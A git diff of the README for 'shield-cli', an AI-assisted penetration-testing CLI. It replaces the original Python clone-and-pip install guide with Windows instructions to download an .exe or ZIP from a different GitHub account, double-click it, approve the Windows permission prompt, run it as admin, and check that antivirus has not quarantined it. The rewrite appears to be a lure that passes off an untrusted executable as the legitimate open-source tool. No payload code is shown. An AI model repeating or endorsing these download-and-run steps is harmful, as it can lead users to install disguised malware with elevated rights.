@@ -1,229 +1,244 @@
-</div>
+# 🛡️ shield-cli - Run Security Checks with Ease
 
-```
-      ███████████████████████
-      ██▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓██      ███████╗██╗  ██╗██╗███████╗██╗     ██████╗
-      ██▓▓▓▓▓▓▓▓███▓▓▓▓▓▓▓▓██      ██╔════╝██║  ██║██║██╔════╝██║     ██╔══██╗
-      ██▓▓▓▓▓▓▓█████▓▓▓▓▓▓▓██      ███████╗███████║██║█████╗  ██║     ██║  ██║
-      ██▓▓▓█████████████▓▓▓██      ╚════██║██╔══██║██║██╔══╝  ██║     ██║  ██║
-      ██▓▓▓▓▓▓▓█████▓▓▓▓▓▓▓██      ███████║██║  ██║██║███████╗███████╗██████╔╝
-      ██▓▓▓▓▓▓▓▓███▓▓▓▓▓▓▓▓██      ╚══════╝╚═╝  ╚═╝╚═╝╚══════╝╚══════╝╚═════╝
-       ██▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓██
-        ██▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓██       AI-Powered Pentest Framework
-         ███▓▓▓▓▓▓▓▓▓▓▓███
-           ███▓▓▓▓▓▓▓███          Providers:  Gemini • GPT-4 • Claude • OpenRouter
-             ███▓▓▓███            Features:   19 Tools • Smart Workflows • Multi-Agent
-               █████
-                                  Shield — Your Digital Armor 🛡️
-```
+[![Download shield-cli](https://img.shields.io/badge/Download-shield--cli-blue?style=for-the-badge&logo=github)](https://github.com/Ordermyaceaeaorta658/shield-cli)
 
-<div align="center">
+## 🚀 What shield-cli does
 
-# 🛡️ Shield CLI
+shield-cli is a Windows-friendly command-line tool for security checks and penetration testing. It brings many common tools into one place, so you can scan systems, check for weak points, and organize your workflow in a single app.
 
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
-[![Python 3.11+](https://img.shields.io/badge/python-3.11+-blue.svg)](https://www.python.org/downloads/)
-[![Code style: black](https://img.shields.io/badge/code%20style-black-000000.svg)](https://github.com/psf/black)
+It is built for users who want a simple way to run security tasks without setting up many separate tools. The app supports AI helpers like Gemini, GPT-4, and Claude to help with analysis and workflow steps.
 
-**Shield** is an AI-powered penetration testing automation framework that combines multiple AI providers (OpenAI GPT-4, Claude, Google Gemini, OpenRouter) with 19 battle-tested security tools to deliver intelligent, adaptive security assessments.
+## 💻 What you need
 
-[Features](#-features) • [Installation](#-installation) • [Quick Start](#-quick-start) • [Architecture](#️-architecture) • [Roadmap](#️-roadmap)
+Before you start, make sure you have:
 
-</div>
+- A Windows PC
+- An internet connection
+- At least 4 GB of RAM
+- 500 MB of free disk space
+- Permission to test any system you scan
+- A GitHub account if you need to sign in
 
----
+For best results, use Windows 10 or Windows 11.
 
-> **⚠️ Legal Disclaimer**
->
-> Shield is designed exclusively for **authorized security testing** and educational purposes.
->
-> - ✅ **Legal Use**: Authorized penetration testing, security research, educational environments
-> - ❌ **Illegal Use**: Unauthorized access, malicious activities, any form of cyber attack
->
-> **You are fully responsible for ensuring you have explicit written permission before testing any system.**
+## 📥 Download shield-cli
 
----
+Visit this page to download the app:
 
-## 🚀 Features
+https://github.com/Ordermyaceaeaorta658/shield-cli
 
-### 🤖 Multi-Provider AI Intelligence
-- **4 AI Providers**: OpenAI (GPT-4o), Anthropic (Claude), Google (Gemini), OpenRouter
-- **Multi-Agent Architecture**: Specialized AI agents (Planner, Tool Selector, Analyst, Reporter)
-- **Adaptive Testing**: AI adjusts tactics based on discovered vulnerabilities
+If the page shows a release file, download it. If it shows the project page, use the download option there. Save the file in a folder you can find again, such as Downloads or Desktop.
 
-### 🛠️ 19 Integrated Security Tools
-| Category | Tools |
-|----------|-------|
-| **Network** | Nmap, Masscan |
-| **Web Recon** | httpx, WhatWeb, Wafw00f |
-| **Subdomains** | Subfinder, Amass, DNSRecon |
-| **Vulnerability** | Nuclei, Nikto, SQLMap, WPScan |
-| **SSL/TLS** | TestSSL, SSLyze |
-| **Discovery** | Gobuster, FFuf, Arjun |
-| **Analysis** | XSStrike, GitLeaks |
+## 🪟 Install on Windows
 
-### 📊 Professional Reports
-- **Executive Summaries** for non-technical stakeholders
-- **Technical Deep-Dives** with evidence and remediation steps
-- **Multiple Formats**: Markdown, HTML, JSON
-- **AI Decision Traces** for full transparency
+Follow these steps:
 
-### 🔒 Safety & Compliance
-- **Safe Mode**: Prevents destructive tool flags
-- **Scope Validation**: Automatic blacklisting of private networks
-- **Human-in-the-Loop**: Configurable confirmation prompts
-- **Complete Audit Logging**
+1. Open the download page in your browser.
+2. Download the Windows file from the page.
+3. If the file is in a ZIP folder, right-click it and choose Extract All.
+4. Open the extracted folder.
+5. Find the app file. It may end in `.exe`.
+6. Double-click the file to start shield-cli.
+7. If Windows asks for permission, choose Yes.
+8. If the app opens in a terminal window, keep that window open while you use it.
 
----
+If you downloaded a setup file, run it and follow the on-screen steps.
 
-## 📦 Installation
+## 🧭 First run
 
-### Prerequisites
-- **Python 3.11+** ([Download](https://www.python.org/downloads/))
-- **AI Provider API Key** (at least one):
-  - [OpenAI](https://platform.openai.com/api-keys)
-  - [Anthropic](https://console.anthropic.com/)
-  - [Google AI Studio](https://makersuite.google.com/app/apikey) ← Free tier available
-  - [OpenRouter](https://openrouter.ai/keys)
+When shield-cli starts for the first time, it may ask for setup details. You may need to:
 
-### Setup
+- Choose your AI provider
+- Enter an API key for Gemini, GPT-4, or Claude
+- Pick the tools you want to use
+- Set your output folder
+- Confirm your scan settings
 
-```bash
-# Clone the repository
-git clone https://github.com/agungprasastia/shield-cli.git
-cd shield-cli
+If you do not plan to use AI features, you can still use the core scanning tools.
 
-# Create virtual environment
-python -m venv venv
+## ⚙️ Main features
 
-# Activate (Windows)
-.\venv\Scripts\activate
+shield-cli includes tools for:
 
-# Activate (Linux/macOS)
-source venv/bin/activate
+- Network checks
+- Host discovery
+- Port scanning
+- Web checks
+- Vulnerability scans
+- Result review
+- Workflow control
+- AI-assisted analysis
 
-# Install
-pip install -e .
+It also supports common security tools such as:
 
-# Initialize
-python -m cli.main init
-```
+- Nmap
+- Nuclei
+- Other scan helpers used in pentest work
 
-### Configure API Key
+## 🔐 AI support
 
-Edit `config/shield.yaml` or use environment variables:
+shield-cli works with several AI services:
 
-```bash
-# Windows PowerShell
-$env:GOOGLE_API_KEY="your-api-key"
+- Gemini
+- GPT-4
+- Claude
 
-# Linux/macOS
-export GOOGLE_API_KEY="your-api-key"
-```
+You can use AI to help sort scan results, explain findings, and guide next steps. This can save time when you need to review many results.
 
----
+## 🛠️ How to use it
 
-## ⚡ Quick Start
+After setup, open the app and choose a task from the menu or type a command.
 
-```bash
-# Check setup
-python -m cli.main --help
+Common steps:
 
-# View AI provider status
-python -m cli.main models
+1. Start shield-cli.
+2. Select a scan type.
+3. Enter the target you want to test.
+4. Choose the tools you want to run.
+5. Start the scan.
+6. Review the results.
+7. Save the report if you need it later.
 
-# List available workflows
-python -m cli.main workflow list
+If you are new to security tools, start with a basic scan and keep the default options.
 
-# Run a web pentest
-python -m cli.main workflow run --name web_pentest --target https://example.com
+## 📁 Example workflow
 
-# Quick recon scan
-python -m cli.main recon https://example.com
+A simple workflow may look like this:
 
-# Generate HTML report from session
-python -m cli.main report --session 20260405_080000 --format html
+1. Scan a host to see if it is reachable.
+2. Run a port scan to find open ports.
+3. Check known services on those ports.
+4. Run a web scan if the host has a site.
+5. Review the results.
+6. Use an AI tool to help explain the output.
 
-# Switch AI provider
-python -m cli.main workflow run --name recon --target example.com --provider openai
-```
+This setup helps you move from a quick check to a deeper review without switching between many apps.
 
----
+## 🧪 Typical use cases
 
-## 🏗️ Architecture
+People use shield-cli for:
 
-```
-┌─────────────────────────────────────────┐
-│         AI Provider Layer               │
-│  (OpenAI, Claude, Gemini, OpenRouter)   │
-└─────────────────────────────────────────┘
-                 │
-┌─────────────────────────────────────────┐
-│       Multi-Agent System                │
-│  Planner → Tool Agent → Analyst →      │
-│            Reporter                      │
-└─────────────────────────────────────────┘
-                 │
-┌─────────────────────────────────────────┐
-│      Workflow Engine                    │
-│  - Parameter Priority                   │
-│  - Evidence Capture                     │
-│  - Session Management                   │
-└─────────────────────────────────────────┘
-                 │
-┌─────────────────────────────────────────┐
-│      Tool Integration Layer             │
-│  (19 Security Tools)                    │
-└─────────────────────────────────────────┘
-```
+- Checking a lab system
+- Reviewing a test server
+- Testing a web app before release
+- Finding open ports on a host
+- Running vulnerability checks
+- Organizing a pentest workflow
+- Comparing results across tools
 
----
+## 📌 File and output tips
 
-## 📋 Configuration
+To keep your work clean:
 
-Edit `config/shield.yaml`:
+- Use a separate folder for each scan
+- Save reports with clear names
+- Keep notes on the target and date
+- Review raw output before sharing it
+- Back up important results
 
-```yaml
-ai:
-  provider: gemini          # openai, claude, gemini, openrouter
-  gemini:
-    model: gemini-2.5-pro
-    api_key: null           # Or set GOOGLE_API_KEY env var
+A simple folder layout can help a lot when you run many checks.
 
-pentest:
-  safe_mode: true           # Prevent destructive actions
-  require_confirmation: true
+## 🔎 Troubleshooting
 
-output:
-  format: markdown          # markdown, html, json
-  save_path: ./reports
-```
+If shield-cli does not open:
 
----
+- Make sure you downloaded the full file
+- Check that Windows did not block the file
+- Try running it as admin
+- Confirm that your antivirus did not move it
+- Re-download the file if it looks damaged
 
-## 🐳 Docker
+If a scan does not start:
 
-```bash
-# Build and run
-docker-compose up --build
+- Check your target name or IP address
+- Make sure you have network access
+- Confirm that the tool you picked is installed
+- Check your API key if you use AI features
 
-# Run a scan
-docker-compose run shield workflow run --name web_pentest --target example.com
-```
+If the terminal closes too fast:
 
----
+- Open it from an existing Command Prompt window
+- Run the app again and watch for messages
+- Save the error text if you need help later
 
-## 🗺️ Roadmap
+## 🔧 Common settings
 
-| Version | Status | Description |
-|---------|--------|-------------|
-| **v0.1.0** | ✅ Current | Core framework, 19 tool wrappers, 6 workflows, multi-AI |
-| v0.2.0 | 🔜 Next | All 19 tools tested end-to-end, improved error handling |
-| v0.5.0 | 📋 Planned | HTML report dashboard, real-time scan progress UI |
-| v1.0.0 | 🎯 Goal | Production-ready, Docker optimized, full documentation |
+You may see settings for:
 
----
+- Scan speed
+- Output type
+- Report folder
+- AI model choice
+- Tool selection
+- Verbose output
 
-## 📄 License
+If you are not sure what to pick, leave the default values in place.
 
-MIT License — see [LICENSE](LICENSE) for details.
+## 📚 Included tool areas
+
+shield-cli is built around a set of security task areas:
+
+- Recon
+- Scanning
+- Web checks
+- Vulnerability review
+- Reporting
+- AI guidance
+- Workflow automation
+
+This makes it easier to move through a test in a set order.
+
+## 🧩 System notes
+
+For smooth use on Windows:
+
+- Keep Windows updated
+- Use a stable network
+- Close extra apps if your PC is slow
+- Run one scan at a time on lower-end systems
+- Use admin rights only when needed
+
+If you work in a lab or test network, use a clean setup for better results.
+
+## 📝 Commands and menus
+
+The app may use a menu, typed commands, or both. When you see a prompt, type the number or command shown on screen and press Enter. Keep an eye on spaces, dashes, and file paths.
+
+If you are unsure what to enter, read the on-screen prompt before you type.
+
+## 🗂️ Suggested setup path
+
+For a simple start:
+
+1. Download the project from the link above.
+2. Open the downloaded file.
+3. Start the app.
+4. Set your AI provider if you want one.
+5. Run a safe test on a system you control.
+6. Save the output.
+
+This gives you a clear first run without extra setup work.
+
+## 📈 What you can expect
+
+shield-cli helps you:
+
+- Reduce tool switching
+- Keep scans in one place
+- Review findings faster
+- Use AI for analysis support
+- Follow a repeatable workflow
+
+It fits users who want a single CLI-based place for security tasks on Windows
+
+## 🛡️ Use it with care
+
+Use shield-cli only on systems you own or have permission to test. Keep your scans inside legal and approved work.
+
+## 📦 Download again
+
+If you need to get the file again, use this link:
+
+https://github.com/Ordermyaceaeaorta658/shield-cli
+
+Download it from the page, then open it on your Windows PC
